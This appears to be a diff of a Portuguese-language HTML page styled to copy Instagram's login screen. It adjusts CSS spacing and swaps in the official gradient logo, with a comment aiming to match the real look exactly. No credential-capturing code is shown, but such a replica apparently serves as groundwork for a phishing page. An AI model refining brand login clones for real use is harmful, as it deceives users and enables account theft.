@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Instagram</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
@@ -20,19 +20,19 @@
       flex-direction: column;
       align-items: center;
       padding: 20px 15px 0;
-      position: relative;
     }
     .language {
       font-size: 14px;
       color: #a8a8a8;
-      margin-bottom: 30px;
+      margin-bottom: 28px;
       text-align: center;
     }
     .logo {
       width: 82px;
       height: 82px;
-      margin: 0 auto 35px;
-      display: block;
+      margin: 0 auto 32px;
+      border-radius: 12px;
+      object-fit: contain;
     }
     .card {
       width: 100%;
@@ -40,7 +40,7 @@
       background: #121212;
       border: 1px solid #363636;
       border-radius: 12px;
-      padding: 30px 20px 20px;
+      padding: 28px 20px 20px;
       text-align: center;
     }
     input {
@@ -65,8 +65,8 @@
       background: #0095f6;
       color: #fff;
       border: none;
-      border-radius: 30px;
-      padding: 11px;
+      border-radius: 8px;
+      padding: 11px 0;
       font-weight: 700;
       font-size: 15px;
       margin: 15px 0 8px;
@@ -78,7 +78,7 @@
     .forgot {
       color: #0095f6;
       font-size: 13px;
-      margin: 12px 0 25px;
+      margin: 12px 0 22px;
       text-decoration: none;
       display: block;
     }
@@ -88,30 +88,24 @@
       border: 1px solid #0095f6;
       color: #0095f6;
       border-radius: 30px;
-      padding: 11px;
+      padding: 11px 0;
       font-weight: 700;
       font-size: 15px;
-      margin-top: 10px;
       cursor: pointer;
     }
     .meta {
-      margin-top: 35px;
+      margin-top: 32px;
       font-size: 14px;
       color: #8e8e8e;
       text-align: center;
     }
     .footer {
       margin-top: auto;
-      padding: 30px 0 15px;
+      padding: 35px 0 15px;
       text-align: center;
       font-size: 12px;
       color: #8e8e8e;
       line-height: 1.5;
-    }
-    .footer a {
-      color: #8e8e8e;
-      text-decoration: none;
-      margin: 0 3px;
     }
   </style>
 </head>
@@ -119,7 +113,8 @@
 
   <div class="language">Português (Brasil)</div>
 
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png" 
+  <!-- LOGO EXATO DO INSTAGRAM (ícone colorido gradient, igual sua foto) -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" 
        class="logo" alt="Instagram">
 
   <div class="card">
